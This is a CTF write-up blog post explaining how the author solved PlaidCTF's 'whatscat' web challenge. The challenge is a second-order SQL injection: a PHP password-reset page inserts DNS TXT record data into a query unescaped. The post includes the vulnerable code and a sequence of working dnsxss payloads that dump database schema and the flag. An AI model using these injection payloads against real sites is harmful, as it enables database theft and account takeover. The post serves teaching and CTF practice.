---
id: 1920
title: 'PlaidCTF writeup for Web-300 &#8211; whatscat (SQL Injection via DNS)'
date: '2014-05-20T16:30:43-05:00'
author: 'Ron Bowes'
layout: revision
guid: 'https://blog.skullsecurity.org/2014/1856-revision-v1'
permalink: '/?p=1920'
---

Hey folks,

This is my writeup for Whatscat, just about the easiest 300-point Web level I've ever solved! I wouldn't normally do a writeup about a level like this, but much like [the mtpox](/2014/plaidctf-web-150-mtpox-hash-extension-attack) level I actually wrote the exact tool for exploiting this, and even wrote a [blog post about it](/2010/stuffing-javascript-into-dns-names) almost exactly 4 years ago - April of 2010. Unlike mtpox, this tool isn't the least bit popular, but it sure made my life easy!

## The set up

Whatscat is a php application where people can post photos of cats and comment on them ([Here's a copy of the source](https://blogdata.skullsecurity.org/whatscat.tar.bz2)).

The vulnerable code is in the password-reset code, in login.php, which looks like this:

```

  <span class="Statement">elseif</span> <span class="Special">(</span><span class="Statement">isset</span><span class="Special">(</span><span class="Statement">$</span><span class="Identifier">_POST</span><span class="Special">[</span>"<span class="Constant">reset</span>"<span class="Special">]))</span> <span class="Special">{</span>
    <span class="Statement">$</span><span class="Identifier">q</span> <span class="Statement">=</span> <span class="Identifier">mysql_query</span><span class="Special">(</span><span class="Identifier">sprintf</span><span class="Special">(</span>"<span class="Constant">select username,email,id from users where username='%s'</span>",
      <span class="Identifier">mysql_real_escape_string</span><span class="Special">(</span><span class="Statement">$</span><span class="Identifier">_POST</span><span class="Special">[</span>"<span class="Constant">name</span>"<span class="Special">])))</span>;
    <span class="Statement">$</span><span class="Identifier">res</span> <span class="Statement">=</span> <span class="Identifier">mysql_fetch_object</span><span class="Special">(</span><span class="Statement">$</span><span class="Identifier">q</span><span class="Special">)</span>;
    <span class="Statement">$</span><span class="Identifier">pwnew</span> <span class="Statement">=</span> "<span class="Constant">cat</span>"<span class="Statement">.</span><span class="Identifier">bin2hex</span><span class="Special">(</span>openssl_random_pseudo_bytes<span class="Special">(</span><span class="Constant">8</span><span class="Special">))</span>;
    <span class="Statement">if</span> <span class="Special">(</span><span class="Statement">$</span><span class="Identifier">res</span><span class="Special">)</span> <span class="Special">{</span>
      <span class="PreProc">echo</span> <span class="Identifier">sprintf</span><span class="Special">(</span>"<span class="Constant"><p>Don't worry %s, we're emailing you a new password at %s</p></span>",
        <span class="Statement">$</span><span class="Identifier">res</span><span class="Type">-></span>username,<span class="Statement">$</span><span class="Identifier">res</span><span class="Type">-></span>email<span class="Special">)</span>;
      <span class="PreProc">echo</span> <span class="Identifier">sprintf</span><span class="Special">(</span>"<span class="Constant"><p>If you are not %s, we'll tell them something fishy is going on!</p></span>",
        <span class="Statement">$</span><span class="Identifier">res</span><span class="Type">-></span>username<span class="Special">)</span>;
<span class="Statement">$</span><span class="Identifier">message</span> <span class="Statement">=</span> <span class="Statement"><<<</span><span class="Special">CAT</span>
Hello. Either you or someone pretending to be you attempted to reset your password.
Anyway, we set your new password to <span class="Statement">$</span><span class="Identifier">pwnew</span>

If it wasn't you who changed your password, we have logged their IP information as follows:
<span class="Special">CAT</span>;
      <span class="Statement">$</span><span class="Identifier">details</span> <span class="Statement">=</span> <span class="Identifier">gethostbyaddr</span><span class="Special">(</span><span class="Statement">$</span><span class="Identifier">_SERVER</span><span class="Special">[</span>'<span class="Constant">REMOTE_ADDR</span>'<span class="Special">])</span><span class="Statement">.</span>
        <span class="Identifier">print_r</span><span class="Special">(</span><span class="Identifier">dns_get_record</span><span class="Special">(</span><span class="Identifier">gethostbyaddr</span><span class="Special">(</span><span class="Statement">$</span><span class="Identifier">_SERVER</span><span class="Special">[</span>'<span class="Constant">REMOTE_ADDR</span>'<span class="Special">]))</span>,<span class="Constant">true</span><span class="Special">)</span>;
      <span class="Identifier">mail</span><span class="Special">(</span><span class="Statement">$</span><span class="Identifier">res</span><span class="Type">-></span>email,"<span class="Constant">whatscat password reset</span>",<span class="Statement">$</span><span class="Identifier">message</span><span class="Statement">.</span><span class="Statement">$</span><span class="Identifier">details</span>,"<span class="Constant">From: whatscat@whatscat.cat</span><span class="Special">\r\n</span>"<span class="Special">)</span>;
      <span class="Identifier">mysql_query</span><span class="Special">(</span><span class="Identifier">sprintf</span><span class="Special">(</span>"<span class="Constant">update users set password='%s', resetinfo='%s' where username='%s'</span>",
              <span class="Statement">$</span><span class="Identifier">pwnew</span>,<span class="Statement">$</span><span class="Identifier">details</span>,<span class="Statement">$</span><span class="Identifier">res</span><span class="Type">-></span>username<span class="Special">))</span>;
    <span class="Special">}</span>
    <span class="Statement">else</span> <span class="Special">{</span>
      <span class="PreProc">echo</span> "<span class="Constant">Hmm we don't seem to have anyone signed up by that name</span>";
    <span class="Special">}</span>
```

Specifically, these lines:

```

      <span class="Statement">$</span><span class="Identifier">details</span> <span class="Statement">=</span> <span class="Identifier">gethostbyaddr</span><span class="Special">(</span><span class="Statement">$</span><span class="Identifier">_SERVER</span><span class="Special">[</span>'<span class="Constant">REMOTE_ADDR</span>'<span class="Special">])</span><span class="Statement">.</span>
        <span class="Identifier">print_r</span><span class="Special">(</span><span class="Identifier">dns_get_record</span><span class="Special">(</span><span class="Identifier">gethostbyaddr</span><span class="Special">(</span><span class="Statement">$</span><span class="Identifier">_SERVER</span><span class="Special">[</span>'<span class="Constant">REMOTE_ADDR</span>'<span class="Special">]))</span>,<span class="Constant">true</span><span class="Special">)</span>;
      <span class="Identifier">mail</span><span class="Special">(</span><span class="Statement">$</span><span class="Identifier">res</span><span class="Type">-></span>email,"<span class="Constant">whatscat password reset</span>",<span class="Statement">$</span><span class="Identifier">message</span><span class="Statement">.</span><span class="Statement">$</span><span class="Identifier">details</span>,"<span class="Constant">From: whatscat@whatscat.cat</span><span class="Special">\r\n</span>"<span class="Special">)</span>;
      <span class="Identifier">mysql_query</span><span class="Special">(</span><span class="Identifier">sprintf</span><span class="Special">(</span>"<span class="Constant">update users set password='%s', resetinfo='%s' where username='%s'</span>",
              <span class="Statement">$</span><span class="Identifier">pwnew</span>,<span class="Statement">$</span><span class="Identifier">details</span>,<span class="Statement">$</span><span class="Identifier">res</span><span class="Type">-></span>username<span class="Special">))</span>;
```

The $details variable is being inserted into the database unescaped. I've noted in the past that people trust DNS results just a bit too much, and this is a great example of that mistake! If we can inject SQL code into a DNS request, we're set!

...this is where I wasted a lot of time, because I didn't notice that the print\_r() is actually part of the same statement as the line before it - I thought only the reverse DNS entry was being put into the database. As such, my friend [Mak](https://twitter.com/mak_kolybabi)—who was working on this level first—tried to find a way to change the PTR record, and broke all kinds of [SkullSpace](http://www.skullspace.ca) infrastructure as a result.

I ended up trying to log in as 'admin'/'password', and, of course, failed. On a hunch, I hit 'forgot password' for admin. That sent me to a [Mailinator](http://mailinator.com/)-like service. I logged into the mailbox, and noticed somebody trying to sql inject using TXT records. This wasn't an actual admin—like I thought it was—it was another player who just gave me a huge hint (hooray for disposable mail services!). Good fortune!

Knowing that a TXT record would work, it actually came in handy that Mak controls the PTR records for all SkullSpace ip addresses. He could do something useful instead of breaking stuff! The server I use for blogs (/me waves) and such is on the SkullSpace network, so I got him to set the PTR record to test.skullseclabs.org. In fact, if you do a reverse lookup for '206.220.196.59' right now, you'll still see that:

```

$ host blog.skullsecurity.org
blog.skullsecurity.org is an alias for skullsecurity.org.
skullsecurity.org has address 206.220.196.59
$ host 206.220.196.59
59.196.220.206.in-addr.arpa domain name pointer test.skullseclabs.org.
```

I control the authoritative server for test.skullseclabs.org—that's why it exists—so I can make it say anything I want for any record. It's great fun! Though arguably overkill for this level, at least I didn't have to flip to my registrar's page every time I wanted to change a record; instead, I can do it quickly using a tool I wrote called [dnsxss](https://github.com/iagox86/nbtool). Here's an example:

```

$ sudo ./dnsxss <span class="Special">--payload=</span><span class="Statement">"</span><span class="Constant">Hello yes this is test</span><span class="Statement">"</span>
Listening <span class="Statement">for </span>requests on 0.0.0.0:<span class="Constant">53</span>
Will response to queries with: Hello/yes/this/is/<span class="Statement">test</span>

$ dig <span class="Statement">-t</span> txt test123.skullseclabs.org
<span class="Statement">[</span>...<span class="Statement">]</span>
<span class="Statement">;;</span> ANSWER SECTION:
test123.skullseclabs.org. <span class="Constant">1</span>     IN      TXT     <span class="Statement">"</span><span class="Constant">Hello yes this is test.test123.skullseclabs.org</span><span class="Statement">"</span>
```

All I had to do was find the right payload!

## The exploit

I'm not a fan of working blind, so I made my own version of this service locally, and turned on SQL errors. Then I got to work constructing an exploit! It was an UPDATE statement, so I couldn't directly exploit this - I could only read indirectly by altering my email address (as you'll see). I also couldn't figure out how to properly terminate the sql string (neither '#' nor '-- ' nor ';' properly terminated due to brackets). In the end, my payload would:

- Tack on an extra clause to the UPDATE that would set the 'email' field to another value
- Read properly right to the end, which means ending the query with "resetinfo='", so the "resetinfo" field gets set to all the remaining crap

So, let's give this a shot!

```
./dnsxss --payload="test', email='test1234', resetinfo='"
```

Then I create an account, reset the password from my ip address, and refresh. The full query—dumped from my test server—looks like:

```
<span class="Statement">update</span> users <span class="Statement">set</span> password=<span class="Constant">'catf7a252e008616c94'</span>, resetinfo=<span class="Constant">'test.skullseclabs.orgArray ( [0] => Array ( [host] => test.skullseclabs.org [class] => IN [ttl] => 1 [type] => TXT [txt] => test'</span>, email=<span class="Constant">'test1234'</span>, resetinfo=<span class="Constant">'.test.skullseclabs.org [entries] => Array ( [0] => test'</span>, email=<span class="Constant">'test1234'</span>, resetinfo=<span class="Constant">' ) ) ) '</span> <span class="Special">where</span> username=<span class="Constant">'ron'</span>
```

As you can see, that's quite a mess (note that the injected stuff appears twice.. super annoying). After that runs, the reset-password page looks like:

```

Don't worry ron, we're emailing you a new password at <strong>test1234</strong>

If you are not ron, we'll tell them something fishy is going on!
```

Sweet! I successfully changed my password!

But... what am I looking for?

MySQL has this super handy database called information\_schema, which contains tables called 'SCHEMATA', 'TABLES', and 'COLUMNS', and it's usually available for anybody to inspect. Let's dump SCHEMATA.SCHEMA\_NAME from everything:

```
./dnsxss --payload="test', email=(select group_concat(SCHEMA_NAME separator ', ') from information_schema.SCHEMATA), resetinfo='"
```

Then refresh a couple times to find:

```

Don't worry ron, we're emailing you a new password at <strong>information_schema, mysql, performance_schema, whatscat</strong>

If you are not ron, we'll tell them something fishy is going on!
```

Great! Three of those are built-in databases, but 'whatscat' looks interesting. Now let's get table names from whatscat:

```
./dnsxss --payload="test', email=(select group_concat(TABLE_NAME separator ', ') from information_schema.TABLES where TABLE_SCHEMA='whatscat'), resetinfo='"
```

Leads to:

```

Don't worry ron, we're emailing you a new password at <strong>comments, flag, pictures, users</strong>

If you are not ron, we'll tell them something fishy is going on!
```

flag! Sweet! That's a pretty awesome looking table! Now we're one simple step away... what columns does 'flag' contain?

```
./dnsxss --payload="test', email=(select group_concat(COLUMN_NAME separator ', ') from information_schema.COLUMNS where TABLE_NAME='flag'), resetinfo='"
```

Leads to:

```

Don't worry ron, we're emailing you a new password at <strong>flag</strong>

If you are not ron, we'll tell them something fishy is going on!
```

All right, we know the flag is in whatscat.flag.flag, so we write one final query:

```
./dnsxss --payload="test', email=(select group_concat(flag separator ', ') from whatscat.flag), resetinfo='"
```

Which gives us:

```

Don't worry ron, we're emailing you a new password at <strong>20billion_d0llar_1d3a</strong>

If you are not ron, we'll tell them something fishy is going on!
```

And now we dance.

## Conclusion

If you're interested in DNS attacks—this scenario and a whole bunch of others—come see my talk at [BSidesQuebec](http://www.bsidesquebec.org/) this June!!!